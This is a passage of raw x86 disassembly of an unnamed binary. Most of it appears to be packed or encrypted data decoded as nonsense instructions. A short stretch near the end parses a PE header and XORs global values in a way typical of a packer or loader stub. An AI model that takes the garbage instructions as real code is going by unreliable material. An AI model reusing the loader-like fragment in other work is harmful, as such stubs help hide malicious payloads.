  40f872:	test   BYTE PTR [esi+edx*4-0x56c0e1ba],0xc0
  40f87a:	mov    esp,0x40a79f95
  40f87f:	jg     0x40f816
  40f881:	in     al,dx
  40f882:	sti    
  40f883:	dec    ebp
  40f884:	inc    esp
  40f885:	mov    ebx,0x5438d8d
  40f88a:	mov    ebx,0x8cfd66cc
  40f88f:	fldenv [ecx*8+0x5db6f5af]
  40f896:	test   eax,0xff76a0b4
  40f89b:	outs   dx,DWORD PTR ds:[esi]
  40f89c:	and    BYTE PTR [eax-0x1c],dl
  40f89f:	and    cl,dl
  40f8a1:	test   eax,0xc23df007
  40f8a6:	mov    ?,esp
  40f8a8:	xor    eax,0xb9d3ec4f
  40f8ad:	nop
  40f8ae:	dec    ebp
  40f8af:	sbb    al,0xa4
  40f8b1:	sub    dl,bl
  40f8b3:	xlat   BYTE PTR ds:[ebx]
  40f8b4:	popf   
  40f8b5:	and    dl,BYTE PTR [eax-0x7b]
  40f8b8:	dec    eax
  40f8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ba:	xor    BYTE PTR [edi],0x76
  40f8bd:	sub    ecx,DWORD PTR [ebx+ebx*1]
  40f8c0:	mov    edi,0x23f0d0a2
  40f8c5:	fcomp  DWORD PTR [eax]
  40f8c7:	mov    ecx,0x3e8afbc8
  40f8cc:	retf   0x4191
  40f8cf:	fistp  QWORD PTR [ebx-0x6ca7fd41]
  40f8d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d6:	jge    0x40f940
  40f8d8:	add    DWORD PTR [eax-0x16],esi
  40f8db:	pop    ebx
  40f8dc:	hlt    
  40f8dd:	cmp    dh,BYTE PTR [ecx+0x7f]
  40f8e0:	xor    cl,al
  40f8e2:	adc    DWORD PTR [esi-0x3b92e712],esp
  40f8e8:	sbb    al,0x86
  40f8ea:	xchg   ebx,eax
  40f8eb:	xchg   esp,eax
  40f8ec:	shl    ch,cl
  40f8ee:	and    dl,BYTE PTR [ecx-0x7b]
  40f8f1:	inc    edi
  40f8f2:	cmp    DWORD PTR [esi+0x72],ebp
  40f8f5:	mov    ecx,0x5c6409a3
  40f8fa:	xlat   BYTE PTR ds:[ebx]
  40f8fb:	and    al,0xbf
  40f8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8fe:	adc    dh,al
  40f900:	mov    esi,esp
  40f902:	inc    ebp
  40f903:	stc    
  40f904:	into   
  40f905:	jge    0x40f8d8
  40f907:	int3   
  40f908:	xchg   esi,eax
  40f909:	arpl   di,bp
  40f90b:	(bad)  
  40f90c:	and    DWORD PTR [esi],edx
  40f90e:	pop    ebx
  40f90f:	jmp    0x47447f0a
  40f914:	cld    
  40f915:	loopne 0x40f8dd
  40f917:	mul    BYTE PTR [ebx]
  40f919:	inc    esi
  40f91a:	leave  
  40f91b:	mov    bh,0x12
  40f91d:	dec    eax
  40f91e:	icebp  
  40f91f:	inc    ebx
  40f920:	call   0xa5e4:0x63a6f4b6
  40f927:	and    bl,BYTE PTR [ecx]
  40f929:	jnp    0x40f98d
  40f92b:	cmp    BYTE PTR [edi+0x326ef765],0x87
  40f932:	pop    ecx
  40f933:	ins    DWORD PTR es:[edi],dx
  40f934:	push   eax
  40f935:	or     al,0xeb
  40f937:	scas   eax,DWORD PTR es:[edi]
  40f938:	cli    
  40f939:	arpl   WORD PTR [esi-0x6b469a63],bx
  40f93f:	jbe    0x40f983
  40f941:	add    esi,eax
  40f943:	jp     0x40f99d
  40f945:	or     eax,0xcbdddba3
  40f94a:	mov    edi,0x815a6745
  40f94f:	(bad)  
  40f950:	dec    ah
  40f952:	call   0x57ed488
  40f957:	cmp    ecx,DWORD PTR [edi+0x63]
  40f95a:	mov    bh,0x6e
  40f95c:	(bad)  
  40f95d:	icebp  
  40f95e:	clc    
  40f95f:	mov    al,ds:0x5e2f96f3
  40f964:	sbb    ebx,edx
  40f966:	inc    esi
  40f967:	and    ebp,DWORD PTR [esi+0x37]
  40f96a:	nop
  40f96b:	mov    edx,0x213f4791
  40f970:	popf   
  40f971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f972:	fst    DWORD PTR [edi+0x2a]
  40f975:	jl     0x40f9c3
  40f977:	jp     0x40f99c
  40f979:	nop
  40f97a:	aaa    
  40f97b:	out    dx,al
  40f97c:	and    BYTE PTR [eax-0x68aab50d],0x81
  40f983:	shr    edi,0xc9
  40f986:	xor    ecx,esi
  40f988:	sbb    esp,DWORD PTR [ebp+0x4]
  40f98b:	or     ecx,esp
  40f98d:	dec    ebp
  40f98e:	xor    al,0xb8
  40f990:	stc    
  40f991:	pop    eax
  40f992:	(bad)
  40f995:	mov    ch,0xde
  40f997:	push   0x2f
  40f999:	mov    bl,0x9c
  40f99b:	fsub   DWORD PTR [esi-0x445d8288]
  40f9a1:	inc    ebx
  40f9a2:	inc    ebp
  40f9a3:	dec    edi
  40f9a4:	dec    eax
  40f9a5:	arpl   WORD PTR [ecx],di
  40f9a7:	shl    BYTE PTR [edi-0x40],0x74
  40f9ab:	adc    DWORD PTR [ebp+0x58],0x43
  40f9af:	hlt    
  40f9b0:	pop    esp
  40f9b1:	cwde   
  40f9b2:	xor    BYTE PTR [edx],ch
  40f9b4:	jbe    0x40f97e
  40f9b6:	add    ebx,DWORD PTR [ecx+0x11]
  40f9b9:	jmp    0x4808:0xdbb
  40f9bf:	jg     0x40fa24
  40f9c1:	mov    edx,0xa9607575
  40f9c6:	mov    ebp,0x2e1ce238
  40f9cb:	cmp    BYTE PTR ds:0x37fa27e0,bl
  40f9d1:	add    eax,0xdbe99bf2
  40f9d6:	fcom   QWORD PTR [edx]
  40f9d8:	add    BYTE PTR ds:0x8aa1c737,dl
  40f9de:	test   eax,0x744a7d5b
  40f9e3:	repnz push esp
  40f9e5:	push   edx
  40f9e6:	ret    0x59df
  40f9e9:	pop    ecx
  40f9ea:	aad    0xda
  40f9ec:	jno    0x40fa47
  40f9ee:	jl     0x40f9ea
  40f9f0:	pop    eax
  40f9f1:	and    dl,BYTE PTR ss:[edx]
  40f9f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f5:	pop    esi
  40f9f6:	push   esp
  40f9f7:	ins    BYTE PTR es:[edi],dx
  40f9f8:	mov    ch,0x6
  40f9fa:	mov    esp,DWORD PTR [ecx+0x4]
  40f9fd:	ror    BYTE PTR [ecx],cl
  40f9ff:	int3   
  40fa00:	jno    0x40f9ab
  40fa02:	push   ebx
  40fa03:	int    0x20
  40fa05:	mov    edx,0x8242ee
  40fa0a:	rcl    BYTE PTR [edx],cl
  40fa0c:	add    BYTE PTR [edx+ebp*8+0x4a18e917],al
  40fa13:	pop    ecx
  40fa14:	inc    ebx
  40fa15:	mov    eax,ds:0x6480541d
  40fa1a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40fa1c:	nop
  40fa1d:	je     0x40fa2b
  40fa1f:	sbb    DWORD PTR [ebx-0x37809c4],0x5c8c7b56
  40fa29:	int3   
  40fa2a:	(bad)  
  40fa2b:	sub    edx,eax
  40fa2d:	mov    al,ds:0x3c9da8a8
  40fa32:	xor    al,0x66
  40fa34:	push   ebp
  40fa35:	les    edi,FWORD PTR [ebp-0x5d1a4dc4]
  40fa3b:	cdq    
  40fa3c:	iret   
  40fa3d:	mov    al,0x63
  40fa3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa40:	pop    ebp
  40fa41:	push   ds
  40fa42:	cmp    eax,0x75417fc4
  40fa47:	rcr    DWORD PTR [edi],0xbc
  40fa4a:	xchg   ecx,eax
  40fa4b:	adc    esi,DWORD PTR [ebx]
  40fa4d:	pop    edi
  40fa4e:	lds    ebx,FWORD PTR [edx+0x54a3ce70]
  40fa54:	mov    DWORD PTR [eax+ebp*2+0x7b],edi
  40fa58:	dec    edx
  40fa59:	inc    esp
  40fa5a:	loop   0x40fa7a
  40fa5c:	test   eax,0xd806d401
  40fa61:	jmp    0xdb886d38
  40fa66:	fwait
  40fa67:	clc    
  40fa68:	mov    ebp,0xc88b81ed
  40fa6d:	mov    bh,0x7a
  40fa6f:	sub    DWORD PTR [edx],0x5b
  40fa72:	xchg   ecx,eax
  40fa73:	push   es
  40fa74:	(bad)  
  40fa76:	pop    ecx
  40fa77:	adc    bh,BYTE PTR [ebx-0x1ceb282d]
  40fa7d:	in     eax,dx
  40fa7e:	add    ecx,DWORD PTR [edi+0x77a1c724]
  40fa84:	jmp    0xe993:0x1d5035ae
  40fa8b:	lds    eax,FWORD PTR [ecx+0x47]
  40fa8e:	jae    0x40fadb
  40fa90:	mov    BYTE PTR [edx],0x60
  40fa93:	int    0x7d
  40fa95:	mov    ecx,0x3ab6d5f9
  40fa9a:	repnz out 0x14,al
  40fa9d:	scas   al,BYTE PTR es:[edi]
  40fa9e:	pop    ecx
  40fa9f:	jmp    0x40fa36
  40faa1:	mov    esp,0x5fdac295
  40faa6:	(bad)
  40faa9:	xor    ch,BYTE PTR [eax]
  40faab:	cmp    BYTE PTR [edi+ebx*1-0x2b],ch
  40faaf:	jae    0x40fad7
  40fab1:	jmp    0xcd60:0x3d20190b
  40fab8:	retf   0xc22c
  40fabb:	scas   al,BYTE PTR es:[edi]
  40fabc:	les    esi,FWORD PTR [ebx-0x56dfc439]
  40fac2:	shr    BYTE PTR [edx+0x4b],cl
  40fac5:	mov    esi,0xb26e435d
  40faca:	mov    eax,ds:0xb3313ac1
  40facf:	sub    al,BYTE PTR [eax-0x6d]
  40fad2:	add    al,0x50
  40fad4:	mov    ah,0x10
  40fad6:	fadd   DWORD PTR [ebx+0x14]
  40fad9:	xchg   edx,eax
  40fada:	inc    ebp
  40fadb:	fiadd  DWORD PTR [ebx-0x35]
  40fade:	sub    DWORD PTR [ecx-0x80],ecx
  40fae1:	inc    edx
  40fae2:	and    dl,BYTE PTR [esi]
  40fae4:	sbb    DWORD PTR [edi+0x3e],edi
  40fae7:	mov    edi,0x1ce4927f
  40faec:	sbb    ecx,ebx
  40faee:	rol    BYTE PTR ds:[esi],1
  40faf1:	es sbb dl,0x78
  40faf5:	in     eax,dx
  40faf6:	shr    al,1
  40faf8:	adc    al,0x23
  40fafa:	xor    BYTE PTR [ebx+ebx*1+0x71],cl
  40fafe:	inc    eax
  40faff:	(bad)  
  40fb00:	icebp  
  40fb01:	mov    WORD PTR [edx],es
  40fb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb04:	popa   
  40fb05:	repz add DWORD PTR [edi-0x4ac6576],eax
  40fb0c:	push   esp
  40fb0d:	pop    ebp
  40fb0e:	pushf  
  40fb0f:	inc    ebp
  40fb10:	arpl   cx,si
  40fb12:	fisttp WORD PTR [edi+edi*2+0x7d0879b3]
  40fb19:	repnz loopne 0x40fb1d
  40fb1c:	push   cs
  40fb1d:	jns    0x40fb80
  40fb1f:	leave  
  40fb20:	pop    ebx
  40fb21:	int    0x1d
  40fb23:	in     eax,0x87
  40fb25:	mov    eax,0xc8003e74
  40fb2a:	pop    eax
  40fb2b:	xchg   BYTE PTR [esi-0x5d],al
  40fb2e:	test   eax,0x732dc5dc
  40fb33:	in     al,dx
  40fb34:	fisubr DWORD PTR [edx+edx*8]
  40fb37:	fnsave [ebx+0x21]
  40fb3a:	out    0x8a,al
  40fb3c:	mov    bh,0x98
  40fb3e:	pop    ecx
  40fb3f:	popf   
  40fb40:	nop
  40fb41:	sbb    al,0x84
  40fb43:	mov    BYTE PTR [eax+0x7ddacbc0],bh
  40fb49:	mov    bl,0xf2
  40fb4b:	icebp  
  40fb4c:	push   esp
  40fb4d:	mov    DWORD PTR ds:0xb3ee397a,eax
  40fb53:	pop    ebp
  40fb54:	or     al,0x72
  40fb56:	icebp  
  40fb57:	push   edx
  40fb58:	inc    esp
  40fb59:	mov    dh,0x92
  40fb5b:	mov    esp,0x3f860c30
  40fb60:	pop    edi
  40fb61:	cmp    al,0xb2
  40fb63:	aas    
  40fb64:	stos   DWORD PTR es:[edi],eax
  40fb65:	and    ebp,esp
  40fb67:	shl    DWORD PTR [esi+0x7b],0x56
  40fb6b:	push   edx
  40fb6c:	mov    DWORD PTR [edx+0x79b82b1e],ebp
  40fb72:	cli    
  40fb73:	test   ecx,ebx
  40fb75:	pop    edx
  40fb76:	add    ebp,DWORD PTR [ecx]
  40fb78:	daa    
  40fb79:	sub    eax,0x9b24c5dd
  40fb7e:	iret   
  40fb7f:	jle    0x40fba6
  40fb81:	mov    bh,BYTE PTR [edi-0x32]
  40fb84:	frstor [edi]
  40fb86:	cmc    
  40fb87:	adc    eax,0x7c920813
  40fb8c:	and    BYTE PTR ds:0xee63c578,dl
  40fb92:	psllq  mm2,mm7
  40fb95:	movq   mm1,QWORD PTR [ecx-0x8ae429f]
  40fb9c:	sbb    eax,0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x3b
  40fbb3:	scas   eax,DWORD PTR es:[edi]
  40fbb4:	jp     0x40fc18
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fc07
  40fbbf:	jge    0x40fb4b
  40fbc1:	daa    
  40fbc2:	push   ss
  40fbc3:	ins    DWORD PTR es:[edi],dx
  40fbc4:	fcomi  st,st(0)
  40fbc6:	jbe    0x40fc2a
  40fbc8:	das    
  40fbc9:	inc    esp
  40fbca:	push   ss
  40fbcb:	call   0xae867e5
  40fbd0:	iret   
  40fbd1:	mov    ds:0x980bfc30,al
  40fbd6:	pop    edx
  40fbd7:	clc    
  40fbd8:	jmp    0xedb30d5f
  40fbdd:	push   es
  40fbde:	xlat   BYTE PTR ds:[ebx]
  40fbdf:	fisub  DWORD PTR [ebx+eax*2+0x3bbda08e]
  40fbe6:	adc    eax,0x97bdc355
  40fbeb:	jns    0x40fc66
  40fbed:	sar    edx,1
  40fbef:	scas   eax,DWORD PTR es:[edi]
  40fbf0:	jp     0x40fbcd
  40fbf2:	addr16 je 0x40fbcb
  40fbf5:	repnz add eax,0xb74b0241
  40fbfb:	push   es
  40fbfc:	addr16 out dx,al
  40fbfe:	sbb    BYTE PTR ds:0x5c8ffbc,bh
  40fc04:	aas    
  40fc05:	out    0xc8,eax
  40fc07:	xor    esp,DWORD PTR [edx-0x6]
  40fc0a:	(bad)  
  40fc0b:	inc    eax
  40fc0c:	lods   al,BYTE PTR ds:[esi]
  40fc0d:	pop    ds
  40fc0e:	xor    edx,edx
  40fc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc11:	std    
  40fc12:	and    eax,0x7f62e1ed
  40fc17:	and    al,0xdf
  40fc19:	cmc    
  40fc1a:	test   BYTE PTR [ebx],al
  40fc1c:	sub    eax,eax
  40fc1e:	dec    ecx
  40fc1f:	cmp    BYTE PTR [edx+ebp*2-0x27],ah
  40fc23:	lds    ebp,FWORD PTR [esp+ebp*2]
  40fc26:	in     eax,dx
  40fc27:	rcl    ecx,0x28
  40fc2a:	mov    DWORD PTR [ebp+0x34],0xecf9261d
  40fc31:	rol    DWORD PTR ds:0xed04b954,0xa6
  40fc38:	or     ah,BYTE PTR [edi]
  40fc3a:	repz and BYTE PTR [edi+0x6deb897d],cl
  40fc41:	pop    es
  40fc42:	out    0x6f,eax
  40fc44:	ins    DWORD PTR es:[edi],dx
  40fc45:	in     al,0xe6
  40fc47:	out    dx,eax
  40fc48:	push   es
  40fc49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc4a:	and    DWORD PTR [edx-0x60f2dd9c],esp
  40fc50:	or     DWORD PTR [eax],0xffffffad
  40fc53:	and    BYTE PTR [ebp-0x1e],al
  40fc56:	or     DWORD PTR [ecx-0x31e54bab],eax
  40fc5c:	pop    edi
  40fc5d:	jge    0x40fcbc
  40fc5f:	cmp    BYTE PTR [edx-0x3a],ch
  40fc62:	pop    eax
  40fc63:	or     al,ah
  40fc65:	ficom  WORD PTR [edx]
  40fc67:	mov    edi,0x6e147bcd
  40fc6c:	xchg   DWORD PTR [eax+0x60358dce],ecx
  40fc72:	sahf   
  40fc73:	xor    al,0x87
  40fc75:	je     0x40fc6f
  40fc77:	outs   dx,DWORD PTR ds:[esi]
  40fc78:	pmaddwd mm6,QWORD PTR [ecx]
  40fc7b:	loop   0x40fc73
  40fc7d:	mov    edx,0x67b6878f
  40fc82:	add    DWORD PTR [eax],ebx
  40fc84:	call   0xeb0464ec
  40fc89:	dec    edx
  40fc8a:	pushf  
  40fc8b:	cli    
  40fc8c:	loopne 0x40fcb5
  40fc8e:	mov    esi,0x9ec3cae3
  40fc93:	outs   dx,DWORD PTR ds:[esi]
  40fc94:	inc    esp
  40fc95:	and    BYTE PTR [ebp-0x4],cl
  40fc98:	shr    DWORD PTR [ecx+0x5378c392],cl
  40fc9e:	jmp    0x40fcef
  40fca0:	je     0x40fc34
  40fca2:	xor    eax,0x62b0052b
  40fca7:	ja     0x40fd01
  40fca9:	xor    eax,0x413cf451
  40fcae:	lods   eax,DWORD PTR ds:[esi]
  40fcaf:	stos   BYTE PTR es:[edi],al
  40fcb0:	or     DWORD PTR [eax-0x586b466d],0x9a78664b
  40fcba:	(bad)
  40fcbd:	adc    edx,DWORD PTR [edx+0x3207a5e3]
  40fcc3:	lds    ebx,FWORD PTR [ebx+0xc]
  40fcc6:	addr16 push edi
  40fcc8:	sbb    ebx,DWORD PTR [edx-0x2f287541]
  40fcce:	xlat   BYTE PTR ds:[ebx]
  40fccf:	(bad)  
  40fcd0:	ins    BYTE PTR es:[edi],dx
  40fcd1:	rol    BYTE PTR [eax+eiz*8-0x62ae941b],0xa7
  40fcd9:	(bad)  
  40fcda:	lods   eax,DWORD PTR ds:[esi]
  40fcdb:	push   ss
  40fcdc:	dec    ebx
  40fcdd:	mov    ecx,ebx
  40fcdf:	pushf  
  40fce0:	push   esp
  40fce1:	repz add al,0xad
  40fce4:	xor    DWORD PTR [eax],edi
  40fce6:	jmp    0x40fcf6
  40fce8:	sbb    eax,0x15aaaf2f
  40fced:	mov    al,0xde
  40fcef:	jmp    0x2f6b:0xd051c04e
  40fcf6:	cli    
  40fcf7:	mov    WORD PTR [edx-0x4a],ss
  40fcfa:	mov    ebp,0x6542f6f6
  40fcff:	mov    ebx,0x6a1202dd
  40fd04:	mov    dl,BYTE PTR [edi+edi*2-0x1f]
  40fd08:	in     eax,dx
  40fd09:	scas   eax,DWORD PTR es:[edi]
  40fd0a:	jb     0x40fd26
  40fd0c:	ins    BYTE PTR es:[edi],dx
  40fd0d:	adc    ebp,DWORD PTR [ebx+0x48]
  40fd10:	inc    edi
  40fd11:	push   edx
  40fd12:	ficomp DWORD PTR [esi]
  40fd14:	lock loope 0x40fc9f
  40fd17:	cdq    
  40fd18:	aam    0x28
  40fd1a:	outs   dx,DWORD PTR ds:[esi]
  40fd1b:	fdiv   st,st(1)
  40fd1d:	jmp    0xd9814850
  40fd22:	ins    BYTE PTR es:[edi],dx
  40fd23:	je     0x40fce4
  40fd25:	cmp    DWORD PTR [eax],ebx
  40fd27:	ror    BYTE PTR [ebx+0x667e775a],1
  40fd2d:	dec    edi
  40fd2e:	fs sub al,0x76
  40fd31:	jbe    0x40fcc0
  40fd33:	mov    DWORD PTR [edi+0x25664043],ebp
  40fd39:	setne  BYTE PTR [ebp+eax*4+0x14b5b3ea]
  40fd41:	xchg   BYTE PTR [edx+0x4d70c9ed],dh
  40fd47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd48:	sbb    ecx,DWORD PTR [esi]
  40fd4a:	add    edi,DWORD PTR [ebx+0x6d7e49c5]
  40fd50:	nop
  40fd51:	push   ecx
  40fd52:	aam    0x79
  40fd54:	int    0xbf
  40fd56:	sahf   
  40fd57:	mov    ebx,0x473ec019
  40fd5c:	into   
  40fd5d:	ins    DWORD PTR es:[edi],dx
  40fd5e:	ret    
  40fd5f:	mov    ch,0xc3
  40fd61:	stos   DWORD PTR es:[edi],eax
  40fd62:	daa    
  40fd63:	ins    BYTE PTR es:[edi],dx
  40fd64:	jmp    0x308afb7b
  40fd69:	ss and eax,0x68d0c6a7
  40fd6f:	in     al,dx
  40fd70:	cld    
  40fd71:	sbb    DWORD PTR [edi],ebp
  40fd73:	jmp    0xc2f8:0x94730617
  40fd7a:	sar    BYTE PTR [edi-0x1],cl
  40fd7d:	jns    0x40fdbd
  40fd7f:	or     BYTE PTR [eax],al
  40fd81:	jp     0x40fd45
  40fd83:	mov    dh,0xf9
  40fd85:	retf   
  40fd86:	into   
  40fd87:	mov    ah,0x6b
  40fd89:	ror    BYTE PTR [edx-0x6f],0xb
  40fd8d:	xor    BYTE PTR ds:0x1eefe27a,dh
  40fd93:	sahf   
  40fd94:	out    0x62,eax
  40fd96:	sbb    BYTE PTR [esi],bl
  40fd98:	cmp    edx,DWORD PTR [edi-0x2a]
  40fd9b:	adc    dh,dh
  40fd9d:	popf   
  40fd9e:	jns    0x40fd43
  40fda0:	lahf   
  40fda1:	jle    0x40fde5
  40fda3:	pop    ecx
  40fda4:	cmp    eax,0xeded9683
  40fda9:	or     cl,BYTE PTR [edi+0x58775bf5]
  40fdaf:	loopne 0x40fe18
  40fdb1:	inc    ecx
  40fdb2:	add    eax,edi
  40fdb4:	iret   
  40fdb5:	in     eax,0xc2
  40fdb7:	or     BYTE PTR [esi-0x76074ca5],ch
  40fdbd:	pop    ebp
  40fdbe:	mov    eax,ds:0xaeb4d58f
  40fdc3:	adc    DWORD PTR [eax+0x46561d5f],ebx
  40fdc9:	inc    eax
  40fdca:	mov    WORD PTR ds:0x545049b9,gs
  40fdd0:	inc    edi
  40fdd1:	fsubr  DWORD PTR [ebx-0x17]
  40fdd4:	and    eax,0x7ea2728
  40fdd9:	jg     0x40fdc7
  40fddb:	xchg   DWORD PTR [esi+0x788d57e7],ebp
  40fde1:	in     eax,0x37
  40fde3:	aas    
  40fde4:	inc    esp
  40fde5:	and    DWORD PTR [ebx+0x5714f460],edi
  40fdeb:	pusha  
  40fdec:	fistp  WORD PTR [esp+ebp*1]
  40fdef:	into   
  40fdf0:	dec    edx
  40fdf1:	std    
  40fdf2:	cli    
  40fdf3:	mov    ebp,0x467905ef
  40fdf8:	jae    0x40fdf1
  40fdfa:	cs ja  0x40fdf2
  40fdfd:	aaa    
  40fdfe:	or     eax,0xb0665f7
  40fe03:	loopne 0x40fe69
  40fe05:	pop    ss
  40fe06:	call   0xb4c3:0x50a3d18d
  40fe0d:	dec    esp
  40fe0e:	mov    ah,0x40
  40fe10:	mov    ds:0x576a4c93,eax
  40fe15:	and    ch,BYTE PTR [edi-0x213ae207]
  40fe1b:	push   ss
  40fe1c:	mov    edi,0x852dc3ba
  40fe21:	push   es
  40fe22:	xchg   ebp,eax
  40fe23:	mov    dh,0x69
  40fe25:	xor    al,0xab
  40fe27:	mov    esp,0x1ca9936
  40fe2c:	das    
  40fe2d:	push   edi
  40fe2e:	push   esp
  40fe2f:	call   0xd3fe6bef
  40fe34:	rcl    DWORD PTR [ebx+0x7e9daca5],0x6e
  40fe3b:	ja     0x40fdfa
  40fe3d:	hlt    
  40fe3e:	(bad)  
  40fe40:	movhps QWORD PTR [edx+0x8],xmm5
  40fe44:	inc    esi
  40fe45:	shl    BYTE PTR [edi+ebp*1-0x10323ed0],1
  40fe4c:	xchg   BYTE PTR [ebp+0x6b],cl
  40fe4f:	in     al,dx
  40fe50:	dec    ebx
  40fe51:	sar    eax,1
  40fe53:	in     eax,dx
  40fe54:	inc    esi
  40fe55:	mov    al,ds:0x9b663a7
  40fe5a:	mov    dh,0x14
  40fe5c:	iret   
  40fe5d:	jecxz  0x40fe17
  40fe5f:	cmc    
  40fe60:	or     dh,cl
  40fe62:	mov    BYTE PTR [eax],ch
  40fe64:	sar    DWORD PTR [edi-0x7f],cl
  40fe67:	mov    ecx,0x9e8a8c70
  40fe6c:	mov    al,ds:0x500e6b46
  40fe71:	or     al,0xf0
  40fe73:	sub    BYTE PTR [edx-0x5c],bl
  40fe76:	(bad)  
  40fe77:	lea    ebp,[ebp-0x7f14052c]
  40fe7d:	mov    ah,0xc2
  40fe7f:	aam    0x6b
  40fe81:	pop    ecx
  40fe82:	pop    ds
  40fe83:	aas    
  40fe84:	out    dx,al
  40fe85:	push   es
  40fe86:	pop    esp
  40fe87:	(bad)  
  40fe88:	neg    BYTE PTR [edx-0x4dddb7f4]
  40fe8e:	sub    bl,BYTE PTR [edi]
  40fe90:	inc    eax
  40fe91:	jmp    0x40fed5
  40fe93:	mov    esp,0x38a9f03b
  40fe98:	fisttp DWORD PTR [edx+0x3df5d8f8]
  40fe9e:	in     eax,0xd0
  40fea0:	adc    bl,BYTE PTR [esi+0x17]
  40fea3:	aas    
  40fea4:	sub    DWORD PTR [ebp+0x58],ecx
  40fea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea8:	mov    ds:0x2af4e235,eax
  40fead:	adc    DWORD PTR [eax+0x5f5cfa97],ecx
  40feb3:	retf   
  40feb4:	enter  0xf40c,0x6c
  40feb8:	push   ecx
  40feb9:	outs   dx,DWORD PTR ds:[esi]
  40feba:	adc    al,0xf5
  40febc:	ins    BYTE PTR es:[edi],dx
  40febd:	xchg   edi,eax
  40febe:	ja     0x40feb9
  40fec0:	inc    ebx
  40fec1:	add    DWORD PTR [ebx-0x2],esi
  40fec4:	repz cld 
  40fec6:	clc    
  40fec7:	mov    edx,0x8181bf96
  40fecc:	jne    0x40ff2b
  40fece:	fadd   st(7),st
  40fed0:	mov    edx,0x42959950
  40fed5:	data16 out 0x57,al
  40fed8:	xchg   ebp,eax
  40fed9:	mov    al,0x39
  40fedb:	sub    dh,BYTE PTR ds:0xaf859dc6
  40fee1:	ffree  st(5)
  40fee3:	adc    esi,DWORD PTR [ecx+0xbfb2feb]
  40fee9:	xchg   DWORD PTR [edi+0x38],ecx
  40feec:	scas   al,BYTE PTR es:[edi]
  40feed:	fwait
  40feee:	inc    edx
  40feef:	add    al,0xeb
  40fef1:	or     eax,0x98c84426
  40fef6:	mov    dl,0xb9
  40fef8:	push   eax
  40fef9:	(bad)  
  40fefa:	add    ch,BYTE PTR [esi-0x123dd33b]
  40ff00:	jl     0x40fecd
  40ff02:	mov    al,ds:0xe60dec53
  40ff07:	pop    ds
  40ff08:	sub    DWORD PTR [esi-0x7f],esp
  40ff0b:	fist   WORD PTR [esp+0x25dd0ff4]
  40ff12:	push   edx
  40ff13:	jae    0x40ff63
  40ff15:	cdq    
  40ff16:	in     eax,0x9c
  40ff18:	or     ebp,DWORD PTR [edi+esi*2]
  40ff1b:	inc    edx
  40ff1c:	xor    al,al
  40ff1e:	pop    ebx
  40ff1f:	out    dx,eax
  40ff20:	sti    
  40ff21:	cmp    eax,0xbc2e5f9f
  40ff26:	mov    eax,0xd4145c91
  40ff2b:	fisttp QWORD PTR [edx+0x3f85ca73]
  40ff31:	xchg   edx,eax
  40ff32:	retf   0xbebf
  40ff35:	fst    QWORD PTR [edi]
  40ff37:	(bad)  
  40ff38:	fcmovnbe st,st(3)
  40ff3a:	cmp    BYTE PTR [eax],ch
  40ff3c:	jne    0x40fefd
  40ff3e:	cs pusha 
  40ff40:	sub    bl,BYTE PTR [edx]
  40ff42:	sub    cl,ch
  40ff44:	xchg   ebp,eax
  40ff45:	mov    ebp,DWORD PTR [ebx-0x7e9f964a]
  40ff4b:	outs   dx,DWORD PTR ds:[esi]
  40ff4c:	push   ebx
  40ff4d:	or     al,0xfb
  40ff4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff50:	cs ins BYTE PTR es:[edi],dx
  40ff52:	xchg   ebx,eax
  40ff53:	mov    eax,ebp
  40ff55:	adc    eax,0xfa7b3791
  40ff5a:	or     DWORD PTR [ebx+ebx*8-0x32abe3a3],esi
  40ff61:	add    ecx,DWORD PTR [ebp+0x5a1ee4a]
  40ff67:	push   0xffffffe6
  40ff69:	push   ds
  40ff6a:	mov    esi,0x31fc45c7
  40ff6f:	test   DWORD PTR [eax+edi*8-0x75f7ba75],ebx
  40ff76:	add    bh,al
  40ff78:	add    eax,0x42e134
  40ff7d:	cmp    bh,BYTE PTR [edx]
  40ff7f:	add    BYTE PTR [eax],al
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	dec    edx
  40ffdd:	pop    ss
  40ffde:	mov    al,0xe8
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ffc4
  40ffe9:	sbb    eax,0x2030a77b
  40ffee:	lods   eax,DWORD PTR ds:[esi]
  40ffef:	mov    ch,BYTE PTR [edx-0x20d3a7fa]
  40fff5:	dec    ebp
  40fff6:	inc    esi
  40fff7:	adc    al,0x18
